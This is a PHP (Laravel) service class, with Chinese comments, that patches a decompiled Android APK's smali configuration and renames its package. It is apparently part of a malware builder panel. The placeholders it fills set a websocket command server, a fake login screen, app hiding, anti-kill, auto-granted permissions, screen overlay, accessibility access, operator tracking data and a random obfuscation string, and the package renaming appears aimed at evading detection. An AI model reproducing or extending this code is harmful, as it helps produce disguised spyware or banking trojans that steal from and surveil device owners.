<?php

declare(strict_types=1);

namespace App\Services\ApkBuilder;

use App\Exceptions\ApkBuilder\ApkBuildException;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;

final class SmaliProcessor
{
    private string $buildDir;

    private string $obfuscationString;

    public function __construct(string $buildDir)
    {
        $this->buildDir = $buildDir;
        $this->obfuscationString = $this->generateObfuscationString();
    }

    private function generateObfuscationString(): string
    {
        $chars = 'qazwsxedcrfvtgbyhnujmikolp';
        $length = random_int(8, 16);
        $result = '';

        for ($i = 0; $i < $length; $i++) {
            $result .= $chars[random_int(0, strlen($chars) - 1)];
        }

        return $result;
    }

    /**
     * 将字符串转义为可在 smali const-string 中安全使用的形式。
     * 防止双引号、反斜杠、换行等破坏 smali 语法导致 apktool 报 Unterminated string literal。
     */
    private function escapeForSmaliString(string $value): string
    {
        $value = str_replace('\\', '\\\\', $value);
        $value = str_replace('"', '\\"', $value);
        // 将换行符转换为 \n 转义序列（保留换行语义，APK 运行时会正确显示换行）
        $value = str_replace(["\r\n", "\r", "\n"], '\\n', $value);
        // 其他连续空白（空格、制表符）压缩为单个空格
        $value = preg_replace('/[ \t]+/u', ' ', $value);

        return trim($value);
    }

    public function modifyConfig(ApkBuildConfig $config, string $assetsKey, Encryptor $encryptor): void
    {
        $smaliPath = $this->buildDir.'/'.ApkBuilderConstants::CONFIGS_SMALI_RELATIVE;

        if (! File::exists($smaliPath)) {
            throw new ApkBuildException("My_Configs.smali not found at: {$smaliPath}", [
                'path' => $smaliPath,
            ]);
        }

        $content = File::get($smaliPath);

        $parsedUrl = parse_url($config->websocketUrl);
        $host = $parsedUrl['host'] ?? 'localhost';
        $path = $parsedUrl['path'] ?? '';
        $useWss = str_starts_with($config->websocketUrl, 'wss://');
        
        // 如果 URL 中明确指定了端口，则使用指定的端口；否则使用协议默认端口
        if (isset($parsedUrl['port'])) {
            $port = $parsedUrl['port'];
        } else {
            // wss 默认使用 443，ws 默认使用 80
            $port = $useWss ? 443 : 80;
        }
        
        // 构建完整的域名:端口/路径格式
        // 对于标准端口（wss:443, ws:80），不添加端口号
        $isStandardPort = ($useWss && $port === 443) || (!$useWss && $port === 80);
        $userDom = $isStandardPort ? $host : $host.':'.$port;
        
        // 添加路径（如果有）
        if (!empty($path)) {
            $userDom .= $path;
        }

        Log::info($userDom);

        // 生成追踪数据字符串，格式: clientName>linkId>appId
        // linkId 使用 userId 作为唯一标识
        $trackingData = sprintf('%s>%s>%s', $config->clientName, $config->userId, $config->appId);

        $replacements = [
            '[Client_N]' => $this->escapeForSmaliString($config->clientName),
            '[_NOTIFI_TITLE_]' => $this->escapeForSmaliString($config->notifyTitle),
            '[_NOTIFI_MSG_]' => $this->escapeForSmaliString($config->notifyMsg),
            '[log-title]' => $this->escapeForSmaliString($config->loginTitle),
            '[log-dis]' => $this->escapeForSmaliString($config->loginDis),
            '[log-btn]' => $this->escapeForSmaliString($config->loginBtn),
            '[log-lng]' => $this->escapeForSmaliString($config->lngShort),
            '[USER_DOM]' => $this->escapeForSmaliString($userDom),
            '[USER_MAIL]' => $this->escapeForSmaliString($encryptor->encryptString($config->email)),
            '[BSE_URL]' => $this->escapeForSmaliString($encryptor->encryptString($config->appUrl)),
            // [USE-AUTOGRANT] 在模板中被赋值给 loadingText 字段，用于加载页标题显示
            '[USE-AUTOGRANT]' => $this->escapeForSmaliString($config->loginTitle),
            '[USE-SUPER]' => $config->useAccess,
            '[USE-ALLPRIM]' => $config->userAllprims,
            '[USE-BLACK]' => $config->userBlackprims,
            '[USE-NOKILL]' => $config->useAntkill,
            '[USE-HIDDEEN]' => $config->hiddenApp,
            '[USE-FAKE]' => $config->hideType,
            '[USE-DRAWOVER]' => $config->useDraw,
            '[USE-OOENACC]' => $config->openAccess,
            '[USE-DIAO]' => $config->diaoType,
            '[USE-GUID]' => $config->installType,
            '[USE-STORE]' => $config->isStoreMode() ? '1' : '0',
            '[USE-CAPLOCK]' => '0',
            '[AST-PAS]' => $this->escapeForSmaliString($assetsKey),
            '[OBFS]' => $this->escapeForSmaliString($this->obfuscationString),
            '[NAME>LNK>ID!]' => $this->escapeForSmaliString($trackingData),  // 追踪数据占位符替换
        ];

        $content = str_replace(array_keys($replacements), array_values($replacements), $content);

        if (! $useWss) {
            $content = str_replace('const-string v1, "wss://"', 'const-string v1, "ws://"', $content);
        }

        File::put($smaliPath, $content);
    }

    public function renamePackage(string $oldPackage, string $newPackage): void
    {
        $oldPath = str_replace('.', '/', $oldPackage);
        $newPath = str_replace('.', '/', $newPackage);

        foreach (ApkBuilderConstants::SMALI_DIRS as $smaliDir) {
            $basePath = $this->buildDir.'/'.$smaliDir;

            if (! File::isDirectory($basePath)) {
                continue;
            }

            $oldDir = $basePath.'/'.$oldPath;
            $newDir = $basePath.'/'.$newPath;

            if (File::isDirectory($oldDir)) {
                File::ensureDirectoryExists(dirname($newDir));
                $this->moveDirectory($oldDir, $newDir);
                $this->replaceReferences($newDir, $oldPackage, $newPackage);
            }

            $this->replaceReferences($basePath, $oldPackage, $newPackage);
        }
    }

    private function moveDirectory(string $src, string $dst): void
    {
        if (! File::moveDirectory($src, $dst)) {
            File::copyDirectory($src, $dst);
            File::deleteDirectory($src);
        }
    }

    private function replaceReferences(string $dir, string $oldPackage, string $newPackage): void
    {
        $oldSmali = 'L'.str_replace('.', '/', $oldPackage);
        $newSmali = 'L'.str_replace('.', '/', $newPackage);

        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)
        );

        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getExtension() === 'smali') {
                $content = File::get($file->getPathname());
                $content = str_replace([$oldSmali, $oldPackage], [$newSmali, $newPackage], $content);
                File::put($file->getPathname(), $content);
            }
        }
    }
}
